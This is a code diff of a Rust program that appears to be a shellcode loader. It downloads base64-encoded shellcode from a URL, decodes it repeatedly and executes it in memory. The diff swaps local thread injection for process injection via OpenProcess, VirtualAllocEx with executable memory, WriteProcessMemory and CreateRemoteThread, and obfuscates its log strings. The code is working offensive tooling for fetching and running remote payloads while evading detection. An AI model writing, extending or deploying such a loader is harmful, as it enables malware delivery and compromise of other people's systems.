@@ -9,22 +9,30 @@ use std::ffi::c_void;
 use reqwest::Client;
 use base64::decode;
 use windows::{
-    Win32::Foundation::{BOOL, GetLastError},
-    Win32::System::Memory::{
-        VirtualAlloc, 
-        VirtualProtect, 
-        PAGE_PROTECTION_FLAGS,
-        MEM_COMMIT,
-        MEM_RESERVE,
-        PAGE_READWRITE,
-        PAGE_EXECUTE_READ,
+    Win32::{
+        Foundation::{
+            CloseHandle,
+            GetLastError
+        },
+        System::{
+            Memory::{
+                VirtualAllocEx, 
+                MEM_COMMIT,
+                MEM_RESERVE,
+                // PAGE_READWRITE,
+                PAGE_EXECUTE_READWRITE,
+            },
+            WindowsProgramming::INFINITE,
+            Threading::{
+                OpenProcess,
+                CreateRemoteThread,
+                GetCurrentProcessId,
+                PROCESS_ALL_ACCESS,
+                WaitForSingleObject
+            }
+        },
     },
-    Win32::System::Threading::{
-        CreateThread,
-        WaitForSingleObject,
-        THREAD_CREATION_FLAGS
-    },
-    Win32::System::WindowsProgramming::INFINITE
+    Win32::System::Diagnostics::Debug::WriteProcessMemory,
 };
 
 
@@ -119,71 +127,43 @@ async fn main() {
     // Grab b64-encoded data from the provided url
     // Decode n_iters times
     // CreateThread with the shellcode
-    if let Ok(shellcode) = get_shellcode(URL.to_string(), B64_ITERATIONS).await {
+    match get_shellcode(URL.to_string(), B64_ITERATIONS).await {
 
-        unsafe {
-            let base_addr = VirtualAlloc(
-                ptr::null_mut(),
-                shellcode.len(),
-                MEM_COMMIT | MEM_RESERVE,
-                PAGE_READWRITE,
-            );
+        Ok(sc) => unsafe {
 
-            if base_addr.is_null() {
-                println!("{}", lc!("Couldn't allocate memory to current proc."));
-            } else {
-                println!("{}", lc!("Allocated memory to current proc."));
-            }
-
-            // copy shellcode into mem
-            println!("{}", lc!("Copying Shellcode to address in current proc."));
-            std::ptr::copy(shellcode.as_ptr() as _, base_addr, shellcode.len());
-            println!("{}", lc!("Copied..."));
-
-            // Flip mem protections from RW to RX with VirtualProtect. Dispose of the call with `out _`
-            println!("{}", lc!("Changing mem protections to RX..."));
-
-            let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
-
-            let mem_protect: BOOL = VirtualProtect(
-                base_addr,
-                shellcode.len(),
-                PAGE_EXECUTE_READ,
-                &mut old_protect,
-            );
-
-            if mem_protect.0 == 0{
-                return println!("{}", lc!("Error during injection"));
-            }
-
-            // Call CreateThread
-            println!("{}", lc!("Calling CreateThread..."));
-
-            let mut tid = 0;
-            let ep: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(base_addr) };
-
-            let h_thread = CreateThread(
-                ptr::null_mut(),
-                0,
-                Some(ep),
-                ptr::null_mut(),
-                THREAD_CREATION_FLAGS(0),
-                &mut tid,
-            ).unwrap();
-
-            if h_thread.is_invalid() {
-                println!("{}", lc!("Error during inject."));
-            } else {
-                println!("Thread Id: {tid}");
-            }
+            let pid: u32 = GetCurrentProcessId();
+            println!("Current PID: {pid}");
+            let h = OpenProcess(PROCESS_ALL_ACCESS, false, pid).unwrap();
+            println!("Handle: {:?}", h);
+            let addr = VirtualAllocEx(h, Some(ptr::null_mut()), sc.len(), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
+            let mut n = 0;
+            WriteProcessMemory(h, addr, sc.as_ptr() as  _, sc.len(), Some(&mut n));
+            let h_thread = CreateRemoteThread(
+                h, 
+                None, 
+                0, 
+                Some(std::mem::transmute(addr)), 
+                None,
+                0, 
+                None
+            )
+            .unwrap();
             
-            if WaitForSingleObject(h_thread, INFINITE) == 0 {
-               println!("{}", lc!("Good!"));
-               println!("{}", lc!("Injection completed!"));
-            } else {
-               let error = GetLastError();
-               println!("{:?}", error);
-            }
+            println!("Handle: {:?}", h_thread);
+            
+            CloseHandle(h);
+
+            
+            // if WaitForSingleObject(h_thread, INFINITE) == windows::Win32::Foundation::WIN32_ERROR(0) {
+            //    println!("{}", lc!("Good!"));
+            //    println!("{}", lc!("Injection completed!"));
+            // } else {
+            //    let error = GetLastError();
+            //    println!("{:?}", error);
+            // }
+        },
+        Err(e) => {
+            println!("{e}")
         }
     }
     
